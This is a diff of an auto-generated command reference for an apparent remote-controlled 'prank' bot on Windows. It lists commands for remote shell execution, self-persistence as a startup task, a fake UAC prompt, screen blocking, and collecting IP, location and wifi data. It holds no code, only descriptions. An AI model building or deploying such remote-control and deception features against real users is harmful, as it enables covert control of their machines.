@@ -306,6 +306,13 @@ _This file is auto-generated. Do not edit manually._
 
 ## input
 
+### `altf4`
+
+**Label:** `❌ Alt+F4`  
+**Function:** `altf4`
+
+> Send Alt+F4.
+
 ### `capslock`
 
 **Label:** `🔠 Capslock`  
@@ -315,21 +322,21 @@ _This file is auto-generated. Do not edit manually._
 
 ### `leftclick`
 
-**Label:** `🖱️ Left Click`  
+**Label:** `🖱️⬅️ Left Click`  
 **Function:** `leftclick`
 
 > Left mouse click.
 
-### `mousecontroller`
+### `mouse_controller`
 
-**Label:** `🎮 Mousecontroller`  
+**Label:** `🎛️ Mouse Controller`  
 **Function:** `mousecontroller`
 
-> Open mouse control menu.
+> Opens mouse controller.
 
 ### `mouselock`
 
-**Label:** `🖱️ Mouselock`  
+**Label:** `🔒🖱️ Mouse Lock`  
 **Function:** `mouselock`
 
 **Positional arguments:**
@@ -340,7 +347,7 @@ _This file is auto-generated. Do not edit manually._
 
 ### `randomkeyboard`
 
-**Label:** `🎹 Randomkeyboard`  
+**Label:** `🎲 Random Keyboard`  
 **Function:** `randomkeyboard`
 
 **Positional arguments:**
@@ -351,7 +358,7 @@ _This file is auto-generated. Do not edit manually._
 
 ### `rightclick`
 
-**Label:** `🖱️ Right Click`  
+**Label:** `🖱️➡️ Right Click`  
 **Function:** `rightclick`
 
 > Right mouse click.
@@ -695,21 +702,6 @@ _This file is auto-generated. Do not edit manually._
 
 > Get public IP and location.
 
-### `urltoast`
-
-**Label:** `🔗 URL Toast`  
-**Function:** `notify_toast`
-
-**Positional arguments:**
-
-- `appname`
-- `title`
-- `message`
-- `url_label`
-- `url`
-
-> Show Windows toast with URL.
-
 ### `wifiinfo`
 
 **Label:** `📶 Wifiinfo`  
@@ -721,7 +713,7 @@ _This file is auto-generated. Do not edit manually._
 
 ### `execute`
 
-**Label:** `null`  
+**Label:** `Execute(helper)`  
 **Function:** `execute`
 
 **Positional arguments:**
@@ -733,20 +725,62 @@ _This file is auto-generated. Do not edit manually._
 - `return_output`
 - `shell`
 
-> null
+> Execute a command(helper)
+
+### `moused`
+
+**Label:** `Mouse Down.`  
+**Function:** `moused`
+
+> Mouse Down.
+
+### `mousel`
+
+**Label:** `Mouse Left.`  
+**Function:** `mousel`
+
+> Mouse Left.
+
+### `mouser`
+
+**Label:** `Mouse Right.`  
+**Function:** `mouser`
+
+> Mouse Right.
+
+### `mouseu`
+
+**Label:** `Mouse Up.`  
+**Function:** `mouseu`
+
+> Mouse Up.
+
+### `nothing`
+
+**Label:** `⚪ Nothing`  
+**Function:** `<lambda>`
+
+> No-op command.
+
+### `test`
+
+**Label:** `🧪 Test`  
+**Function:** `test`
+
+> Run test routine.
 
 ## pranks
 
 ### `block_screen`
 
-**Label:** `Block Screen`  
+**Label:** `🖥️ Block Screen`  
 **Function:** `wrapper_block_screen`
 
 **Positional arguments:**
 
 - `timeout`
 
-> Block screen
+> Block user screen temporarily forcing them to see a screenshot.
 
 ### `camerawallpaper`
 
@@ -804,7 +838,7 @@ _This file is auto-generated. Do not edit manually._
 
 ### `hidecursor`
 
-**Label:** `Hide Cursor`  
+**Label:** `🖱️ Hide Mouse Cursor`  
 **Function:** `wrapper_for_hide_cursor`
 
 **Positional arguments:**
@@ -868,14 +902,14 @@ _This file is auto-generated. Do not edit manually._
 
 ### `set_jumpscare_volume`
 
-**Label:** `Set Jumpscare Volume`  
+**Label:** `🔊 Jumpscare Volume`  
 **Function:** `setJumpscareVolume`
 
 **Positional arguments:**
 
 - `volume`
 
-> Set jumpscare's volume.
+> Adjust jumpscare volume.
 
 ### `setvideowallpaper`
 
@@ -890,14 +924,14 @@ _This file is auto-generated. Do not edit manually._
 
 ### `showqr`
 
-**Label:** `QR Overlay`  
+**Label:** `🟨 QR Overlay`  
 **Function:** `show_qr_overlay`
 
 **Positional arguments:**
 
 - `url`
-- `text`
 - `duration`
+- `text`
 
 > Display QR code overlay with custom text. Args: url [text] [duration]
 
@@ -950,6 +984,13 @@ _This file is auto-generated. Do not edit manually._
 
 > Play knocking sound.
 
+### `mibombo`
+
+**Label:** `💣 Mi Bombo`  
+**Function:** `mibombo`
+
+> Play 'Mi Bombo' sound.
+
 ### `pss`
 
 **Label:** `👂 Psst`  
@@ -987,13 +1028,6 @@ _This file is auto-generated. Do not edit manually._
 
 ## system
 
-### `altf4`
-
-**Label:** `⌨️ Altf4`  
-**Function:** `altf4`
-
-> Send Alt+F4.
-
 ### `clear`
 
 **Label:** `🧹 Clear`  
@@ -1010,10 +1044,10 @@ _This file is auto-generated. Do not edit manually._
 
 ### `fakeuac`
 
-**Label:** `Fake UAC`  
+**Label:** `🛡️ Fake UAC`  
 **Function:** `fakeuac`
 
-> Fake UAC prompt.
+> Show fake UAC prompt.
 
 ### `selfdestruction`
 
@@ -1034,6 +1068,17 @@ _This file is auto-generated. Do not edit manually._
 > Power off PC.
 
 ## system_control
+
+### `add_as_task`
+
+**Label:** `⏰ Set as startup task`  
+**Function:** `add_as_task`
+
+**Positional arguments:**
+
+- `task_name`
+
+> Adds itself as a task
 
 ### `cmdsession`
 
@@ -1127,10 +1172,17 @@ _This file is auto-generated. Do not edit manually._
 
 ### `chat`
 
-**Label:** `Chat`  
+**Label:** `💬 Chat`  
 **Function:** `chat`
 
-> Chat.
+> Open chat interface.
+
+### `get_audio_toasts`
+
+**Label:** `🔊 Toast Sounds`  
+**Function:** `get_audio_wintoasts`
+
+> Lists all the available audios for Windows Toasts.
 
 ### `messagebox`
 
@@ -1143,6 +1195,39 @@ _This file is auto-generated. Do not edit manually._
 - `title`
 
 > Show custom message box.
+
+### `toast`
+
+**Label:** `🔔 Notification Toast`  
+**Function:** `notification_toast`
+
+**Positional arguments:**
+
+- `appname`
+- `title`
+- `message`
+- `audio_name`
+- `loop`
+- `callback`
+
+> Show Windows toast.
+
+### `urltoast`
+
+**Label:** `🔗 URL Toast`  
+**Function:** `notification_toast_with_url`
+
+**Positional arguments:**
+
+- `appname`
+- `title`
+- `message`
+- `url_label`
+- `url`
+- `audio_name`
+- `loop`
+
+> Show Windows toast with URL.
 
 ## utility
 
@@ -1160,17 +1245,30 @@ _This file is auto-generated. Do not edit manually._
 
 > Show help menu.
 
-### `nothing`
+### `restart`
 
-**Label:** `Nothing`  
-**Function:** `<lambda>`
+**Label:** `🔄 Restart`  
+**Function:** `restart`
 
-> No-op command.
+**Positional arguments:**
+
+- `confirm`
+- `verbose`
+- `custom_message`
+
+> Restarts the bot process.
+
+### `set_time_restart`
+
+**Label:** `⏱️ Set Time Restart`  
+**Function:** `setTimeoutRestart`
+
+> Sets bot time threshold before restarting.
 
 ### `status`
 
-**Label:** `Check Status`  
-**Function:** `<lambda>`
+**Label:** `🟢 Check Status`  
+**Function:** `send_status`
 
 > Just checking if the bot is online.
 
@@ -1184,10 +1282,3 @@ _This file is auto-generated. Do not edit manually._
 - `confirm`
 
 > Stop current operation.
-
-### `test`
-
-**Label:** `🧪 Test`  
-**Function:** `test`
-
-> Run test routine.
